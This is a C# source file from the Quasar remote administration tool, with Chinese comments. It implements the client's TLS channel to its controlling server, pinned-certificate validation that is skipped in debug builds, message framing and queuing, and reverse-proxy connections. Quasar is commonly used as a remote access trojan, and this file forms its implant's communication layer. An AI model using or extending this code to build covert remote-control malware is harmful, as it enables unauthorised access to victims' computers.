using Quasar.Client.ReverseProxy;
using Quasar.Common.Extensions;
using Quasar.Common.Messages;
using Quasar.Common.Messages.ReverseProxy;
using Quasar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace Quasar.Client.Networking
{
    public class Client : ISender
    {
        /// <summary>
        /// 由于客户出现无法恢复的问题而发生。
        /// </summary>
        public event ClientFailEventHandler ClientFail;

        /// <summary>
        /// 代表一个将处理客户端失败的方法。
        /// </summary>
        /// <param name="s">已经失败的客户端。</param>
        /// <param name="ex">包含客户端失败原因信息的异常。</param>
        public delegate void ClientFailEventHandler(Client s, Exception ex);

        /// <summary>
        /// 引发一个事件，通知订阅者客户端已经失败。
        /// </summary>
        /// <param name="ex">包含客户端失败原因信息的异常。</param>
        private void OnClientFail(Exception ex)
        {
            var handler = ClientFail;
            handler?.Invoke(this, ex);
        }

        /// <summary>
        /// 当客户端的状态改变时发生。
        /// </summary>
        public event ClientStateEventHandler ClientState;

        /// <summary>
        /// 代表将处理客户端状态变化的方法。
        /// </summary>
        /// <param name="s">改变其状态的客户端。</param>
        /// <param name="connected">客户端新的连接状态。</param>
        public delegate void ClientStateEventHandler(Client s, bool connected);

        /// <summary>
        /// 引发一个事件，通知订阅者客户端的状态已经改变。
        /// </summary>
        /// <param name="connected">客户端的新的连接状态。</param>
        private void OnClientState(bool connected)
        {
            if (Connected == connected) return;

            Connected = connected;

            var handler = ClientState;
            handler?.Invoke(this, connected);
        }

        /// <summary>
        /// 当收到来自服务器的消息时发生。
        /// </summary>
        public event ClientReadEventHandler ClientRead;

        /// <summary>
        /// 代表一个将处理来自服务器的消息的方法。
        /// </summary>
        /// <param name="s">收到信息的客户端。</param>
        /// <param name="message">服务器收到的信息。</param>
        /// <param name="messageLength">信息的长度。</param>
        public delegate void ClientReadEventHandler(Client s, IMessage message, int messageLength);

        /// <summary>
        /// 触发一个事件，通知订阅者，服务器已经收到了一个消息。
        /// </summary>
        /// <param name="message">服务器收到的信息。</param>
        /// <param name="messageLength">信息长度。</param>
        private void OnClientRead(IMessage message, int messageLength)
        {
            var handler = ClientRead;
            handler?.Invoke(this, message, messageLength);
        }

        /// <summary>
        /// 当客户端发送消息时发生。
        /// </summary>
        public event ClientWriteEventHandler ClientWrite;

        /// <summary>
        /// 代表将处理发送的消息的方法。
        /// </summary>
        /// <param name="s">发送信息的客户端。</param>
        /// <param name="message">客户端已发送的信息。</param>
        /// <param name="messageLength">信息长度。</param>
        public delegate void ClientWriteEventHandler(Client s, IMessage message, int messageLength);

        /// <summary>
        /// 引发一个事件，通知订阅者，客户端已经发送了一个消息。
        /// </summary>
        /// <param name="message">客户端已发送的信息。</param>
        /// <param name="messageLength">信息长度。</param>
        private void OnClientWrite(IMessage message, int messageLength)
        {
            var handler = ClientWrite;
            handler?.Invoke(this, message, messageLength);
        }

        /// <summary>
        /// 收到的信息的类型。
        /// </summary>
        public enum ReceiveType
        {
            Header,
            Payload
        }

        /// <summary>
        /// 用于接收数据的缓冲区大小，单位为字节。
        /// </summary>
        public int BUFFER_SIZE { get { return 1024 * 16; } } // 16KB

        /// <summary>
        /// 保持通话的时间，单位是ms。
        /// </summary>
        public uint KEEP_ALIVE_TIME { get { return 25000; } } // 25s

        /// <summary>
        /// 保持连接的时间间隔，单位是ms。
        /// </summary>
        public uint KEEP_ALIVE_INTERVAL { get { return 25000; } } // 25s

        /// <summary>
        /// 头部大小，以字节为单位。
        /// </summary>
        public int HEADER_SIZE { get { return 4; } } // 4B

        /// <summary>
        /// 信息的最大尺寸，以字节为单位。
        /// </summary>
        public int MAX_MESSAGE_SIZE { get { return (1024 * 1024) * 5; } } // 5MB

        /// <summary>
        /// 返回一个包含该客户端的所有代理客户端的数组。
        /// </summary>
        public ReverseProxyClient[] ProxyClients
        {
            get
            {
                lock (_proxyClientsLock)
                {
                    return _proxyClients.ToArray();
                }
            }
        }

        /// <summary>
        /// 获取客户端是否当前已连接到服务器。
        /// </summary>
        public bool Connected { get; private set; }

        /// <summary>
        /// 用于通信的数据流。
        /// </summary>
        private SslStream _stream;

        /// <summary>
        /// 服务器认证。
        /// </summary>
        private readonly X509Certificate2 _serverCertificate;

        /// <summary>
        /// 该客户端持有的所有连接的代理客户端的列表。
        /// </summary>
        private List<ReverseProxyClient> _proxyClients = new List<ReverseProxyClient>();

        /// <summary>
        /// 信息类型的内部索引。
        /// </summary>
        private int _typeIndex;

        /// <summary>
        /// 代理客户端列表的锁定对象。
        /// </summary>
        private readonly object _proxyClientsLock = new object();

        /// <summary>
        ///接收信息的缓冲区。
        /// </summary>
        private byte[] _readBuffer;

        /// <summary>
        /// 客户端传入的有效载荷的缓冲区。
        /// </summary>
        private byte[] _payloadBuffer;

        /// <summary>
        /// 保存要发送的信息的队列。
        /// </summary>
        private readonly Queue<IMessage> _sendBuffers = new Queue<IMessage>();

        /// <summary>
        /// 判断客户端是否正在发送消息。
        /// </summary>
        private bool _sendingMessages;

        /// <summary>
        /// 锁定对象为发送消息的布尔值。
        /// </summary>
        private readonly object _sendingMessagesLock = new object();

        /// <summary>
        /// 保存要读取的缓冲区的队列。
        /// </summary>
        private readonly Queue<byte[]> _readBuffers = new Queue<byte[]>();

        /// <summary>
        /// 判断客户端是否正在读取信息。
        /// </summary>
        private bool _readingMessages;

        /// <summary>
        /// 锁定对象，用于读取信息的布尔值。
        /// </summary>
        private readonly object _readingMessagesLock = new object();

        // Receive info
        private int _readOffset;
        private int _writeOffset;
        private int _readableDataLen;
        private int _payloadLen;
        private ReceiveType _receiveState = ReceiveType.Header;

        /// <summary>
        /// mutex可以防止在<see cref="_stream"/>上同时进行多个写操作。
        /// </summary>
        private readonly Mutex _singleWriteMutex = new Mutex();

        /// <summary>
        /// 客户端的构造函数，初始化序列化器类型。
        /// </summary>
        /// <param name="serverCertificate">服务器证书。</param>
        protected Client(X509Certificate2 serverCertificate)
        {
            _serverCertificate = serverCertificate;
            _readBuffer = new byte[BUFFER_SIZE];
            TypeRegistry.AddTypesToSerializer(typeof(IMessage), TypeRegistry.GetPacketTypes(typeof(IMessage)).ToArray());
        }

        /// <summary>
        /// 试图在指定的端口连接到指定的ip地址。
        /// </summary>
        /// <param name="ip">要连接的IP地址。</param>
        /// <param name="port">主机的端口。</param>
        protected void Connect(IPAddress ip, ushort port)
        {
            Socket handle = null;
            try
            {
                Disconnect();

                handle = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                handle.SetKeepAliveEx(KEEP_ALIVE_INTERVAL, KEEP_ALIVE_TIME);
                handle.Connect(ip, port);

                if (handle.Connected)
                {
                    _stream = new SslStream(new NetworkStream(handle, true), false, ValidateServerCertificate);
                    _stream.AuthenticateAsClient(ip.ToString(), null, SslProtocols.Tls12, false);
                    _stream.BeginRead(_readBuffer, 0, _readBuffer.Length, AsyncReceive, null);
                    OnClientState(true);
                }
                else
                {
                    handle.Dispose();
                }
            }
            catch (Exception ex)
            {
                handle?.Dispose();
                OnClientFail(ex);
            }
        }

        /// <summary>
        /// 通过与所包含的服务器证书进行比较来验证服务器证书。
        /// </summary>
        /// <param name="sender">回调的发送方。</param>
        /// <param name="certificate">要验证的服务器证书。</param>
        /// <param name="chain">X.509链。</param>
        /// <param name="sslPolicyErrors">SSL政策错误。</param>
        /// <returns>Returns <value>true</value> when the 验证 was successful, otherwise <value>false</value>.</returns>
        private bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            // for debugging don't validate server certificate
            return true;
#else
            var serverCsp = (RSACryptoServiceProvider)_serverCertificate.PublicKey.Key;
            var connectedCsp = (RSACryptoServiceProvider)new X509Certificate2(certificate).PublicKey.Key;
            // 将收到的服务器证书与所含的服务器证书进行比较，以验证我们是否连接到了正确的服务器。
            return _serverCertificate.Equals(certificate);
#endif
        }

        private void AsyncReceive(IAsyncResult result)
        {
            int bytesTransferred;

            try
            {
                bytesTransferred = _stream.EndRead(result);

                if (bytesTransferred <= 0)
                    throw new Exception("no bytes transferred");
            }
            catch (NullReferenceException)
            {
                return;
            }
            catch (ObjectDisposedException)
            {
                return;
            }
            catch (Exception)
            {
                Disconnect();
                return;
            }

            byte[] received = new byte[bytesTransferred];

            try
            {
                Array.Copy(_readBuffer, received, received.Length);
            }
            catch (Exception ex)
            {
                OnClientFail(ex);
                return;
            }

            lock (_readBuffers)
            {
                _readBuffers.Enqueue(received);
            }

            lock (_readingMessagesLock)
            {
                if (!_readingMessages)
                {
                    _readingMessages = true;
                    ThreadPool.QueueUserWorkItem(AsyncReceive);
                }
            }

            try
            {
                _stream.BeginRead(_readBuffer, 0, _readBuffer.Length, AsyncReceive, null);
            }
            catch (ObjectDisposedException)
            {
            }
            catch (Exception ex)
            {
                OnClientFail(ex);
            }
        }

        private void AsyncReceive(object state)
        {
            while (true)
            {
                byte[] readBuffer;
                lock (_readBuffers)
                {
                    if (_readBuffers.Count == 0)
                    {
                        lock (_readingMessagesLock)
                        {
                            _readingMessages = false;
                        }
                        return;
                    }

                    readBuffer = _readBuffers.Dequeue();
                }

                _readableDataLen += readBuffer.Length;
                bool process = true;
                while (process)
                {
                    switch (_receiveState)
                    {
                        case ReceiveType.Header:
                            {
                                if (_payloadBuffer == null)
                                    _payloadBuffer = new byte[HEADER_SIZE];

                                if (_readableDataLen + _writeOffset >= HEADER_SIZE)
                                {
                                    // 完全收到的标头
                                    int headerLength = HEADER_SIZE - _writeOffset;

                                    try
                                    {
                                        Array.Copy(readBuffer, _readOffset, _payloadBuffer, _writeOffset, headerLength);

                                        _payloadLen = BitConverter.ToInt32(_payloadBuffer, _readOffset);

                                        if (_payloadLen <= 0 || _payloadLen > MAX_MESSAGE_SIZE)
                                            throw new Exception("invalid header");

                                        // 试图重新使用适合的旧的有效载荷缓冲区。
                                        if (_payloadBuffer.Length <= _payloadLen + HEADER_SIZE)
                                            Array.Resize(ref _payloadBuffer, _payloadLen + HEADER_SIZE);
                                    }
                                    catch (Exception)
                                    {
                                        process = false;
                                        Disconnect();
                                        break;
                                    }

                                    _readableDataLen -= headerLength;
                                    _writeOffset += headerLength;
                                    _readOffset += headerLength;
                                    _receiveState = ReceiveType.Payload;
                                }
                                else // _readableDataLen + _writeOffset < HeaderSize
                                {
                                    // 只收到头的一部分
                                    try
                                    {
                                        Array.Copy(readBuffer, _readOffset, _payloadBuffer, _writeOffset, _readableDataLen);
                                    }
                                    catch (Exception)
                                    {
                                        process = false;
                                        Disconnect();
                                        break;
                                    }
                                    _readOffset += _readableDataLen;
                                    _writeOffset += _readableDataLen;
                                    process = false;
                                    // 没有什么可处理的了
                                }
                                break;
                            }
                        case ReceiveType.Payload:
                            {
                                int length = (_writeOffset - HEADER_SIZE + _readableDataLen) >= _payloadLen
                                    ? _payloadLen - (_writeOffset - HEADER_SIZE)
                                    : _readableDataLen;

                                try
                                {
                                    Array.Copy(readBuffer, _readOffset, _payloadBuffer, _writeOffset, length);
                                }
                                catch (Exception)
                                {
                                    process = false;
                                    Disconnect();
                                    break;
                                }

                                _writeOffset += length;
                                _readOffset += length;
                                _readableDataLen -= length;

                                if (_writeOffset - HEADER_SIZE == _payloadLen)
                                {
                                    // 完全收到的有效载荷
                                    try
                                    {
                                        using (PayloadReader pr = new PayloadReader(_payloadBuffer, _payloadLen + HEADER_SIZE, false))
                                        {
                                            IMessage message = pr.ReadMessage();

                                            OnClientRead(message, _payloadBuffer.Length);
                                        }
                                    }
                                    catch (Exception)
                                    {
                                        process = false;
                                        Disconnect();
                                        break;
                                    }

                                    _receiveState = ReceiveType.Header;
                                    _payloadLen = 0;
                                    _writeOffset = 0;
                                }

                                if (_readableDataLen == 0)
                                    process = false;

                                break;
                            }
                    }
                }

                _readOffset = 0;
                _readableDataLen = 0;
            }
        }

        /// <summary>
        /// 向连接的服务器发送一个信息。
        /// </summary>
        /// <typeparam name="T">信息的类型。</typeparam>
        /// <param name="message">要发送的信息。</param>
        public void Send<T>(T message) where T : IMessage
        {
            if (!Connected || message == null) return;

            lock (_sendBuffers)
            {
                _sendBuffers.Enqueue(message);

                lock (_sendingMessagesLock)
                {
                    if (_sendingMessages) return;

                    _sendingMessages = true;
                    ThreadPool.QueueUserWorkItem(ProcessSendBuffers);
                }
            }
        }

        /// <summary>
        /// 向连接的服务器发送一个信息。
        /// 阻断线程，直到消息发送完毕。
        /// </summary>
        /// <typeparam name="T">信息的类型。</typeparam>
        /// <param name="message">要发送的信息。</param>
        public void SendBlocking<T>(T message) where T : IMessage
        {
            if (!Connected || message == null) return;

            SafeSendMessage(message);
        }

        /// <summary>
        /// 安全地发送一个信息，并防止同时发送多个信息。
        /// 对<see cref="_stream"/>的写操作。
        /// </summary>
        /// <param name="message">要发送的信息。</param>
        private void SafeSendMessage(IMessage message)
        {
            try
            {
                _singleWriteMutex.WaitOne();
                using (PayloadWriter pw = new PayloadWriter(_stream, true))
                {
                    OnClientWrite(message, pw.WriteMessage(message));
                }
            }
            catch (Exception)
            {
                Disconnect();
                SendCleanup(true);
            }
            finally
            {
                _singleWriteMutex.ReleaseMutex();
            }
        }

        private void ProcessSendBuffers(object state)
        {
            while (true)
            {
                if (!Connected)
                {
                    SendCleanup(true);
                    return;
                }

                IMessage message;
                lock (_sendBuffers)
                {
                    if (_sendBuffers.Count == 0)
                    {
                        SendCleanup();
                        return;
                    }

                    message = _sendBuffers.Dequeue();
                }

                SafeSendMessage(message);
            }
        }

        private void SendCleanup(bool clear = false)
        {
            lock (_sendingMessagesLock)
            {
                _sendingMessages = false;
            }

            if (!clear) return;

            lock (_sendBuffers)
            {
                _sendBuffers.Clear();
            }
        }

        /// <summary>
        /// 断开客户端与服务器的连接，断开由该客户端持有的所有代理，
        /// 并处置与该客户端相关的其他资源。
        /// </summary>
        public void Disconnect()
        {
            if (_stream != null)
            {
                _stream.Close();
                _readOffset = 0;
                _writeOffset = 0;
                _readableDataLen = 0;
                _payloadLen = 0;
                _payloadBuffer = null;
                _receiveState = ReceiveType.Header;
                //_singleWriteMutex.Dispose(); TODO: 通过在断开连接时创建新的客户端来修复插座的重复使用

                if (_proxyClients != null)
                {
                    lock (_proxyClientsLock)
                    {
                        try
                        {
                            foreach (ReverseProxyClient proxy in _proxyClients)
                                proxy.Disconnect();
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
            }

            OnClientState(false);
        }

        public void ConnectReverseProxy(ReverseProxyConnect command)
        {
            lock (_proxyClientsLock)
            {
                _proxyClients.Add(new ReverseProxyClient(command, this));
            }
        }

        public ReverseProxyClient GetReverseProxyByConnectionId(int connectionId)
        {
            lock (_proxyClientsLock)
            {
                return _proxyClients.FirstOrDefault(t => t.ConnectionId == connectionId);
            }
        }

        public void RemoveProxyClient(int connectionId)
        {
            try
            {
                lock (_proxyClientsLock)
                {
                    for (int i = 0; i < _proxyClients.Count; i++)
                    {
                        if (_proxyClients[i].ConnectionId == connectionId)
                        {
                            _proxyClients.RemoveAt(i);
                            break;
                        }
                    }
                }
            }
            catch { }
        }
    }
}
